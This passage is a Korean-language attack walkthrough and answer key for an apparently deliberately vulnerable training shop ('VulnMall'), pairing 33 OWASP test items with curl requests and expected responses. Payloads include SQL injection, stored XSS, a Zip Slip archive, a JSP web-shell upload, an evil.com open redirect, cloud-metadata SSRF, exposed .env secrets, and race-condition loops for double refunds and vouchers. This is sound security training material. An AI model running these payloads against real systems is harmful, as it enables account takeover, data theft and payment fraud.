    "username": "alice",
    "role": "ADMIN",
    "rawDecryptedPayload": "role=ADMIN;user=alice..."
}
```

---

## 29. Predictable Reset Token

**WSTG-CRYP-03** | 소스: `CryptoAuthController.generateResetLink()` (107~111행)
**취약 구문**: `MD5(username + epochSecond)` - 예측 가능한 시드

### 공격 요청

```bash
# 비밀번호 재설정 링크 발급
curl -s -X POST "http://localhost:8080/api/auth/crypto/forgot-password-link?username=victim" | python3 -m json.tool
```

### 기대 응답

```json
{
    "status": "SUCCESS",
    "resetUrl": "/reset-password?token=a1b2c3d4e5f6...",
    "algorithm": "MD5(username + timestamp)"
}
```

토큰 생성 알고리즘이 `MD5(username + 현재시각_초단위)`이므로, 공격자가 요청 시점의 타임스탬프를 알면 동일한 토큰을 재현할 수 있습니다.

---

## 30. 계정 열거 (Username Enumeration)

**WSTG-ATHN-02** | 소스: `AuthController.login()` (49~64행)

### 공격 요청

```bash
# 존재하는 사용자
curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrongpassword"}' | python3 -m json.tool

# 존재하지 않는 사용자
curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"nonexistent","password":"test"}' | python3 -m json.tool
```

### 기대 응답

```json
// 존재하는 사용자 + 틀린 비밀번호
{"status": 401, "error": "BadCredentials", "message": "비밀번호가 올바르지 않습니다."}

// 존재하지 않는 사용자
{"status": 401, "error": "UserNotFound", "message": "해당 아이디('nonexistent')는 등록되지 않은 사용자입니다."}
```

오류 메시지가 다르므로 공격자는 유효한 아이디 목록을 수집할 수 있습니다.

---

## 31. Open Redirect

**WSTG-CLNT-04** | 소스: `PublicExposureController.openRedirect()` (56행)
**취약 구문**: `targetUrl.contains("vulnmall.local")` 단순 문자열 포함 여부만 검사

### 공격 요청

```bash
# 도메인 문자열을 서브도메인에 포함시켜 우회
curl -v "http://localhost:8080/api/auth/redirect?url=http://evil.com/phishing?ref=vulnmall.local"
```

### 기대 결과

```
< HTTP/1.1 302
< Location: http://evil.com/phishing?ref=vulnmall.local
```

`vulnmall.local` 문자열이 URL 어딘가에 포함되기만 하면 리다이렉트가 허용되므로, 피싱 사이트로의 유도가 가능합니다.

---

## 32. 민감정보 노출

**WSTG-INFO-05 / WSTG-CONF-04** | 소스: `PublicExposureController`

### 공격 요청

```bash
# .env 환경변수 파일 노출
curl -s http://localhost:8080/.env

# Git 메타데이터 노출
curl -s http://localhost:8080/.git/HEAD

# 데이터베이스 백업 덤프 노출
curl -s http://localhost:8080/backup.sql
```

### 기대 응답

```
# /.env 응답:
DATABASE_URL=jdbc:mysql://localhost:3306/vulnmall
DB_USERNAME=root
DB_PASSWORD=vulnroot1234
JWT_SECRET=VulnMallSuperSecretKeyForJWTSigning1234567890
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

```
# /backup.sql 응답:
INSERT INTO users (username, password, email, role) VALUES ('admin', 'admin123', ...);
```

DB 접속 정보, JWT 시크릿, AWS 키, 관리자 계정 등 핵심 인증 정보가 전부 노출됩니다.

---

## 33. CRLF / Log Injection

**WSTG-INPV-15** | 소스: `LogController.recordLog()` (28행)
**취약 구문**: `logger.info("... " + clientMsg)` - 개행 문자 미필터링

### 공격 요청

```bash
curl -s -X POST http://localhost:8080/api/support/log \
  -H "Content-Type: application/json" \
  -d '{"message": "정상 피드백\n[AUDIT_LOGGER] INFO  ADMIN login success from 10.0.0.1 - admin@vulnmall.local"}' | python3 -m json.tool
```

### 기대 결과

서버 로그 파일에 다음과 같이 가짜 관리자 로그인 기록이 삽입됩니다:

```
INFO [CLIENT_EVENT] User feedback received: 정상 피드백
INFO ADMIN login success from 10.0.0.1 - admin@vulnmall.local
```

감사 로그를 조작하여 공격 흔적을 은폐하거나 허위 이벤트를 삽입할 수 있습니다.

---

## 34. Zip Slip

**WSTG-INPV-12** | 소스: `FileController.uploadZipArchive()` (119행)
**취약 구문**: `new File(UPLOAD_DIR, entry.getName())` - ZIP 엔트리 경로에 `../../` 포함 시 상위 디렉터리 탈출

### 공격 개념

악성 ZIP 파일 내부에 `../../etc/cron.d/malicious` 같은 경로명을 가진 엔트리를 포함시키면, 압축 해제 시 `uploads/` 디렉터리 바깥에 파일을 쓸 수 있습니다.

```bash
# 악성 ZIP 생성 (Python 예시)
python3 -c "
import zipfile, io
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as zf:
    zf.writestr('../../tmp/zipslip_proof.txt', 'Zip Slip Exploited!')
buf.seek(0)
open('malicious.zip', 'wb').write(buf.read())
"

# 업로드
curl -s -X POST http://localhost:8080/api/files/upload-zip \
  -F "file=@malicious.zip" | python3 -m json.tool
```

### 기대 응답

```json
{
    "message": "압축 파일이 성공적으로 해제되었습니다.",
    "extractedFiles": ["../../tmp/zipslip_proof.txt"]
}
```

`extractedFiles`에 `../../` 경로가 포함되어 있으면 디렉터리 탈출이 성공한 것입니다.

---

## 35. Unrestricted File Upload

**WSTG-INPV-12** | 소스: `FileController.uploadFile()` (85~90행)
**취약 구문**: 확장자 화이트리스트 검증 없이 원본 파일명 유지

### 공격 요청

```bash
# HTML 파일 업로드 (XSS 벡터)
echo '<html><body><script>alert("Uploaded XSS")</script></body></html>' > malicious.html
curl -s -X POST http://localhost:8080/api/files/upload \
  -F "file=@malicious.html" | python3 -m json.tool
```

### 기대 응답

```json
{
    "message": "파일이 성공적으로 업로드되었습니다.",
    "url": "/uploads/malicious.html",
    "filename": "malicious.html",
    "size": 71
}
```

### 확인

브라우저에서 `http://localhost:8080/uploads/malicious.html` 접속 시 스크립트가 실행됩니다.
JSP, SVG 등 서버 사이드 실행 가능한 파일도 제한 없이 업로드할 수 있습니다.

---

## 36. 배송지 주소록 BOLA / IDOR (BOLA_ADDRESS)
**WSTG-ATHZ-04** | 엔드포인트: `DELETE /api/addresses/{id}` / `PUT /api/addresses/{id}`

타인의 배송지 주소 식별자(`id`)를 전달하여 본인 소유가 아닌 타인의 등록된 배송지를 무단 열람하거나 삭제/수정합니다.
```bash
# 타인의 배송지 주소록 삭제
curl -s -X DELETE http://localhost:8080/api/addresses/1 \
  -H "Authorization: Bearer $BOB_TOKEN"
```

---

## 37. 배송지 메모 Stored XSS (XSS_STORED_ADDRESS)
**WSTG-INPV-02** | 엔드포인트: `POST /api/addresses`

배송 요청 메모(`deliveryMemo`)에 악성 스크립트를 삽입하여 저장한 후, 주소록 관리 및 주문서에서 렌더링 시 실행됩니다.
```bash
curl -s -X POST http://localhost:8080/api/addresses \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "recipientName": "홍길동",
    "phone": "010-1111-2222",
    "postalCode": "06234",
    "addressLine1": "서울시 강남구 테헤란로 152",
    "deliveryMemo": "<img src=x onerror=alert(\"ADDRESS_XSS\")>"
  }'
```

---

## 38. 주소록 검색 SQL Injection (SQLI_ADDRESS)
**WSTG-INPV-05** | 엔드포인트: `GET /api/addresses/search`

도로명 주소 검색 시 싱글 쿼트(`'`)를 이용해 SQL 구문 조작 및 데이터베이스 에러를 유발합니다.
```bash
curl -s "http://localhost:8080/api/addresses/search?keyword='" \
  -H "Authorization: Bearer $ALICE_TOKEN"
```

---

## 39. 지갑 잔액 음수 충전 결제 변조 (WALLET_NEGATIVE_CHARGE)
**WSTG-BUSL-09** | 엔드포인트: `POST /api/wallet/charge`

충전 금액(`amount`) 또는 결제 승인 금액(`paidAmount`)에 음수 및 변조된 값을 입력하여 시스템 로직 오류를 발생시킵니다.
```bash
curl -s -X POST http://localhost:8080/api/wallet/charge \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"amount": 100000, "paidAmount": -100, "paymentMethod": "CARD"}'
```

---

## 40. 프로모션 바우처 동시성 Race Condition (WALLET_RACE_CONDITION)
**WSTG-BUSL-04** | 엔드포인트: `POST /api/wallet/voucher`

1회용 프로모션 바우처 코드를 동시에 여러 스레드로 등록 요청하여 중복으로 지갑 잔액을 증식시킵니다.
```bash
for i in {1..5}; do
  curl -s -X POST http://localhost:8080/api/wallet/voucher \
    -H "Authorization: Bearer $ALICE_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"code": "CYBER_BONUS_100K"}' &
done
wait
```

---

## 41. CSRF 지갑 잔액 무단 송금 (CSRF_WALLET)
**WSTG-SESS-05** | 엔드포인트: `POST /api/wallet/transfer`

안티 CSRF 토큰 부재를 악용하여 로그인된 피해자가 악성 웹페이지 방문 시 피해자 잔액을 공격자 지갑으로 강제 이체시킵니다.
```bash
curl -s -X POST http://localhost:8080/api/wallet/transfer \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"targetUsername": "bob", "amount": 10000}'
```

---

## 42. 장바구니 요청 메모 Stored XSS (XSS_STORED_CART)
**WSTG-INPV-02** | 엔드포인트: `POST /api/cart`

장바구니 담기 시 요청사항 메모 필드에 자바스크립트 페이로드를 전달하여 장바구니 모달에서 실행시킵니다.
```bash
curl -s -X POST http://localhost:8080/api/cart \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"productId": 1, "quantity": 1, "memo": "<script>alert(\"CART_XSS\")</script>"}'
```

---

## 43. 장바구니 품목 조작 BOLA / IDOR (BOLA_CART)
**WSTG-ATHZ-04** | 엔드포인트: `DELETE /api/cart/items/{id}`

타인의 장바구니 아이템 ID를 인자로 넘겨 소유권 확인 없이 타인의 품목을 삭제하거나 수량을 변경합니다.
```bash
curl -s -X DELETE http://localhost:8080/api/cart/items/2 \
  -H "Authorization: Bearer $BOB_TOKEN"
```

---

## 44. 통합 관리자 포털 권한 우회 (ADMIN_BYPASS)
**WSTG-ATHZ-02** | 엔드포인트: `GET /api/admin/check`

`X-Admin-Role: true` 또는 `X-Forwarded-For: 127.0.0.1` 헤더를 조작하여 일반 사용자 권한으로 관리자 영역에 침투합니다.
```bash
curl -s http://localhost:8080/api/admin/check \
  -H "X-Admin-Role: true"
```

---

## 45. VIP 멤버십 가입비 변조 (MEMBERSHIP_PRICE_TAMPER)
**WSTG-BUSL-09** | 엔드포인트: `POST /api/membership/subscribe`

정상가 ₩9,900원의 월 구독료를 0원 또는 음수로 조작하여 공짜로 VIP PRIME 권한을 획득합니다.
```bash
curl -s -X POST http://localhost:8080/api/membership/subscribe \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"plan": "PRIME", "price": 0, "welcomeNote": "공짜 가입"}'
```

---

## 46. VIP 시크릿 특가관 BFLA 인가 우회 (MEMBERSHIP_BFLA_BYPASS)
**WSTG-ATHZ-02** | 엔드포인트: `GET /api/membership/exclusive-products`

비구독자 상태에서 일반 미공개 VIP 단독 특가관 API를 직접 호출하여 특가 품목을 열람합니다.
```bash
curl -s http://localhost:8080/api/membership/exclusive-products \
  -H "Authorization: Bearer $BOB_TOKEN"
```

---

## 47. VIP 바우처 동시성 Race Condition (MEMBERSHIP_COUPON_RACE)
**WSTG-BUSL-04** | 엔드포인트: `POST /api/membership/claim-coupon`

VIP 가입 시 1회만 제공되는 ₩50,000 바우처를 동시 다중 요청을 통해 수십 장 중복 발급받습니다.
```bash
for i in {1..5}; do
  curl -s -X POST http://localhost:8080/api/membership/claim-coupon \
    -H "Authorization: Bearer $ALICE_TOKEN" &
done
wait
```

---

## 48. VIP 환영 인사말 Stored XSS (MEMBERSHIP_STORED_XSS)
**WSTG-INPV-02** | 엔드포인트: `POST /api/membership/subscribe`

VIP 소개글(`welcomeNote`)에 `<img src=x onerror=alert(1)>` 스크립트를 전달하여 프로필 및 관리자 화면에서 실행시킵니다.
```bash
curl -s -X POST http://localhost:8080/api/membership/subscribe \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"plan": "PRIME", "price": 9900, "welcomeNote": "<img src=x onerror=alert(\"VIP_XSS\")>"}'
```

---

## 49. 이중 환불 동시성 Race Condition (REFUND_RACE_CONDITION)
**WSTG-BUSL-04** | 엔드포인트: `POST /api/orders/{id}/refund`

동일 주문에 대해 동시 다발적인 환불 요청을 마이크로초 단위로 전송하여 결제 금액을 2회 이상 중복 환불받아 지갑 잔액을 부당 증식시킵니다.
```bash
for i in {1..5}; do
  curl -s -X POST http://localhost:8080/api/orders/1/refund \
    -H "Authorization: Bearer $ALICE_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"reason": "단순 변심", "reasonDetails": "레이스"}' &
done
wait
```

---

## 50. 반품 검수 절차 우회 (REFUND_WORKFLOW_BYPASS)
**WSTG-BUSL-02** | 엔드포인트: `POST /api/orders/{id}/refund`

배송 완료(`DELIVERED`)된 상품의 회수/검수 절차를 `direct: true` 파라미터 주입으로 건너뛰고 즉시 전액 환불을 승인받습니다.
```bash
curl -s -X POST http://localhost:8080/api/orders/1/refund \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"reason": "파손 환불", "direct": true}'
```

---

## 51. 환불 사유 메모 Stored XSS (REFUND_STORED_XSS)
**WSTG-INPV-02** | 엔드포인트: `POST /api/orders/{id}/refund`

환불 상세 사유에 스크립트를 삽입하여 사용자의 주문 내역 및 관리자의 주문 관리 포털에서 실행시킵니다.
```bash
curl -s -X POST http://localhost:8080/api/orders/1/refund \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"reason": "기타", "reasonDetails": "<script>alert(\"REFUND_XSS\")</script>"}'
```

---

## 52. 커스텀 덱 BOLA / IDOR (WISHLIST_BOLA_IDOR)
**WSTG-ATHZ-04** | 엔드포인트: `GET /api/wishlist/decks/{id}`

타인(VIP Victim)이 작성한 비공개(Private) 기밀 덱 ID를 직접 호출하여 소유권 검증 없이 기밀 메모(`secretNote`)를 탈취합니다.
```bash
curl -s http://localhost:8080/api/wishlist/decks/2 \
  -H "Authorization: Bearer $BOB_TOKEN"
```

---

## 53. 커스텀 덱 소개글 Stored XSS (WISHLIST_STORED_XSS)
**WSTG-INPV-02** | 엔드포인트: `POST /api/wishlist/decks`

덱 이름 또는 공개 설명에 악성 스크립트를 삽입하여 덱 목록 및 공유 링크 열람 시 실행시킵니다.
```bash
curl -s -X POST http://localhost:8080/api/wishlist/decks \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "deckName": "작전 덱",
    "description": "<img src=x onerror=alert(\"DECK_XSS\")>",
    "isPublic": true,
    "productIds": [1]
  }'
```

---

## 54. 출석체크 날짜 변조 및 중복 수령 (ATTENDANCE_DATE_TAMPER)
**WSTG-BUSL-04** | 엔드포인트: `POST /api/points/attendance`

클라이언트가 `customDate`에 미래/과거 날짜를 주입하거나 동시성 레이스로 하루 다중 출석 보상(+1,000P)을 수령합니다.
```bash
curl -s -X POST http://localhost:8080/api/points/attendance \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"customDate": "2026-12-31"}'
```

---

## 55. 룰렛 당첨 포인트 클라이언트 조작 (ROULETTE_CLIENT_TAMPER)
**WSTG-CLNT-01** | 엔드포인트: `POST /api/points/roulette`

서버가 난수로 검증하지 않고 클라이언트 요청 페이로드(`requestedPrizePoints: 50000`)를 신뢰하여 대량 포인트를 부당 취득합니다.
```bash
curl -s -X POST http://localhost:8080/api/points/roulette \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"requestedPrizePoints": 50000}'
```

---

## 56. 음수 포인트 복합 결제 악용 (POINTS_NEGATIVE_EXPLOIT)
**WSTG-BUSL-09** | 엔드포인트: `POST /api/orders`

주문 결제 시 `pointsUsed`에 음수(-100,000)를 주입하여 수식 역전으로 총 결제액을 조작하거나 잔액을 증식시킵니다.
```bash
curl -s -X POST http://localhost:8080/api/orders \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "recipientName": "앨리스",
    "phone": "010-1234-5678",
    "shippingAddress": "서울시 강남구 테헤란로",
    "totalAmount": 100000,
    "pointsUsed": -50000
  }'
```

---

## 57. 1:1 비밀 고객지원 티켓 BOLA / IDOR (INQUIRY_BOLA_IDOR)
**WSTG-ATHZ-04** | 엔드포인트: `GET /api/inquiries/{id}`

`GET /api/inquiries/{id}` 호출 시 소유권 및 비밀글 여부를 검증하지 않아 타인(VIP)의 비밀 티켓을 무단 열람합니다.
```bash
curl -s http://localhost:8080/api/inquiries/2 \
  -H "Authorization: Bearer $BOB_TOKEN"
```

---

## 58. 1:1 고객지원 헬프데스크 무제한 파일 업로드 (TICKET_FILE_UPLOAD)
**WSTG-INPV-12** | 엔드포인트: `POST /api/inquiries/upload`

증빙 파일 업로드 시 확장자 검증 부재로 `.jsp`, `.html`, `.svg` 웹쉘 및 악성 스크립트를 서버에 업로드합니다.
```bash
echo '<% out.println("NexusTech Shell"); %>' > shell.jsp
curl -s -X POST http://localhost:8080/api/inquiries/upload \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -F "file=@shell.jsp"
rm -f shell.jsp
```

---

## 59. 재고 초과 판매 레이스 컨디션 (STOCK_RACE_CONDITION)
**WSTG-BUSL-04** | 엔드포인트: `POST /api/orders`

재고가 1개 남은 상품에 대해 마이크로초 단위로 동시 다중 결제 요청을 전송하여 DB Lock 부재로 음수 재고 초과 판매(Overselling)를 유발합니다.
```bash
for i in {1..4}; do
  curl -s -X POST http://localhost:8080/api/orders \
    -H "Authorization: Bearer $ALICE_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
      "recipientName": "동시주문_'$i'",
      "phone": "010-0000-0000",
      "shippingAddress": "레이스 테스트 배송지",
      "totalAmount": 100000,
      "pointsUsed": 0
    }' &
done
wait
```

---

## 60. 재입고 알림 콜백 Webhook SSRF (RESTOCK_WEBHOOK_SSRF)
**WSTG-INPV-19** | 엔드포인트: `POST /api/products/{id}/notify-restock`

품절 상품 재입고 알림 신청 시 Webhook URL에 내부 루프백(`http://127.0.0.1:8080/api/admin/metrics`) 또는 클라우드 메타데이터(`169.254.169.254`)를 입력하여 내부망 정보를 반환받습니다.
```bash
curl -s -X POST http://localhost:8080/api/products/10/notify-restock \
  -H "Content-Type: application/json" \
  -d '{
    "email": "tester@nexus.local",
    "webhookUrl": "http://127.0.0.1:8080/api/admin/metrics"
  }'
```

---

## 61. 전자 영수증 원장 조회 및 인쇄 (RECEIPT_EXPORT)
**엔드포인트**: `GET /api/orders/{id}/receipt`

주문별 전자 세금계산서/거래명세서 원장 데이터, 품목별 공급가액, 부가세(10%), 전자서명 및 직인을 확인합니다.
```bash
curl -s http://localhost:8080/api/orders/1/receipt \
  -H "Authorization: Bearer $ALICE_TOKEN"
```

---

## 검증 체크리스트 (총 61개 취약점 완비)

| 단계 | 작업 | 상태 |
|------|------|------|
| 1 | 백엔드 서버 가동 확인 (`/actuator/health`) | 완료 |
| 2 | 스코어보드 웹소켓 연결 확인 (`/scoreboard.html`) | 완료 |
| 3 | 인젝션 21종 검증 (SQLi, XSS, Path Traversal, XXE, SSTI, Cmd, ZipSlip, FileUpload 등) | 완료 |
| 4 | 암호화 결함 2종 검증 (AES-ECB, Predictable Token) | 완료 |
| 5 | 인증 및 인가 13종 검증 (JWT Confusion, User Enum, Mass Assignment, BOLA, HPP, WAF Bypass) | 완료 |
| 6 | 세션 및 클라이언트 6종 검증 (CSRF, DOM XSS, Open Redirect, Roulette Tamper) | 완료 |
| 7 | 비즈니스 로직 결함 13종 검증 (Price/Points Tampering, Race Condition, Rounding, Workflow Bypass) | 완료 |
| 8 | SSRF 및 정보 노출 검증 (Restock Webhook SSRF, Config Exposure) | 완료 |

---

## 초기화 방법

H2 인메모리 DB를 사용하므로 서버를 재시작하거나 스코어보드에서 '발견 기록 초기화' 버튼을 클릭하면 모든 취약점 상태가 `schema-h2.sql` 기준으로 초기화됩니다.

```bash
# 서버 재시작
java -jar target/vuln-mall-backend-1.0.0.jar --spring.profiles.active=h2
```

